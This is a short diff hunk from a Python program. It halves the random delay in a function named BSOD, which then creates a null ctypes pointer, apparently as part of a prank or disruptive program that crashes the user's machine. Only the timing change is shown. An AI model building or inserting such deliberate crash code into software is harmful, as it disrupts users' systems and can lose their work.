@@ -216,7 +216,7 @@ def window_flush():
     tk.mainloop()
     
 def BSOD():
-    sleep(randint(30, 60))
+    sleep(randint(15, 30))
 
     nullptr = POINTER(c_int)()
 
